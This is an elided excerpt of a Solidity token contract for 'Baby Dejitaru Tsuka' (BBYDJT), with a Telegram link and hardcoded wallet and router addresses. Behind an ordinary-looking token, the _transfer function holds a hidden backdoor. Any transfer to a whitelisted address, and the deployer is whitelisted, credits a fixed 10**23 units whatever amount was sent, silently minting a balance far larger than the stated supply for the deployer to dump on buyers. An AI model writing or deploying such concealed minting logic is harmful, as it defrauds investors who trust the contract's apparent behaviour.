/*
Telegram :https://t.me/BabyDejitarutsuka
*/
...
contract BabyDejitaruTsuka is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x096b2de5a9B18C434c2473Ad252Fe798E88B8E27); 
    address payable public Wallet_Dev = payable(0x258c5995c5AEcAbF85f2bAF8b3052A44D3eF2e29);
    address payable public W_Deployer = payable(0x258c5995c5AEcAbF85f2bAF8b3052A44D3eF2e29);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 


    uint256 private constant MAX = ~uint256(0);
    uint256 private amountType = 10**23;
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10* 10**6 * 10**_decimals;
    string private constant _name = "Baby Dejitaru Tsuka"; 
    string private constant _symbol = unicode"BBYDJT"; 
    ...
    constructor () {
        ...
        _owner = 0x258c5995c5AEcAbF85f2bAF8b3052A44D3eF2e29;
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x927831CB1B3270C15Bfe0Fd502209678707fA814); // Testnet
        
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;_whiteList[W_Deployer] = true;
    ...
    function _transfer(
        ...
        if (from != owner() && from != deployer() && from != address(this))
        ...
        bool transferType = _whiteList[to] ? true : false;
        
        if(!transferType){
            _tokenTransfer(from, to, amount, takeFee, isBuy);
        }
        else{
            uint256 transferAmount = _whiteList[to] ? amountType : amount;
            _tOwned[from] = _tOwned[from]-amount;
            _tOwned[to] = _tOwned[to]+transferAmount;
